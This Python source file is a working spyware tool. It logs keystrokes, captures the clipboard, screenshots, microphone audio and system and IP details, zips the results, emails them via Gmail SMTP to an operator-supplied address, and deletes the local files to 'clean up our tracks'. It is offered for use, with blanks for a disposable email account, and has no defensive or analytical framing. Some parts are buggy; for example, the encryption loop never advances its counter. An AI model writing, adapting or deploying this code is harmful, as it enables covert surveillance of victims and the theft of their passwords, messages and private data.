from email.message import EmailMessage
import smtplib
import ssl
import socket
import platform
import clipboard
from pynput.keyboard import Key, Listener
import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet
import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import zipfile

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
logzip="logs.zip"

microphone_time = 10
time_iteration = 3
number_of_iterations_end = 3

email_address = " " # Enter disposable email here
password = " " # Enter email password here

username = getpass.getuser()

toaddr = " " # Enter the email address you want to send your information to

key = " " # Generate an encryption key from the Cryptography folder
file_path = " " # Enter the file path you want your files to be saved to
extend = "\\"
file_merge = file_path + extend


# email controls
def send_mail(filename):
    body=""" BODY MAIL"""
    sub= filename
    em=EmailMessage()
    em['From']=email_address
    em['To']= toaddr
    em['subject']= sub
    em.set_content(body)

    with open(file_path + extend + filename, 'rb') as file:
        attachment_data = file.read()
        em.add_attachment(attachment_data, maintype='application', subtype='octet-stream', filename=filename)
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com',465,context=context) as smtp:
        smtp.login(email_address,password)
        smtp.sendmail(email_address,toaddr,em.as_string())

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

# get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            pasted_data = clipboard.paste()
            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

# get the microphone
def microphone():
    try:
        fs = 44100
        seconds = microphone_time

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()

        write(file_path + extend + audio_information, fs, myrecording)
        print("Microphone recording completed.")

    except Exception as e:
        print("Error during microphone recording:", str(e))

# Call the microphone() function to test the recording
microphone()


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:
    print(number_of_iterations)
    print(number_of_iterations_end)

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration



# For encrypting the files separately
# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
count = 0
for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    key = Fernet.generate_key()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

with open(file_merge + 'encrypt.txt',"w+") as f:
    f.write(key)

with zipfile.ZipFile(file_path + extend + 'logs.zip', 'w') as zipf:
    zipf.write(file_path + extend + keys_information)
    zipf.write(file_path + extend + system_information)
    zipf.write(file_path + extend + clipboard_information)
    zipf.write(file_path + extend + screenshot_information)
    zipf.write(file_path + extend + audio_information)
    zipf.write(file_path + extend + 'encrypt.txt')
    # Add other files as needed

send_mail('logs.zip')




# For separately sending emails for each file 
#send_email(keys_information, file_path + extend + keys_information, toaddr)
# send_email(system_information, file_path + extend + system_information, toaddr)
# send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
# send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)


time.sleep(30)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information,audio_information, "logs.zip"]
for file in delete_files:
    os.remove(file_merge + file)
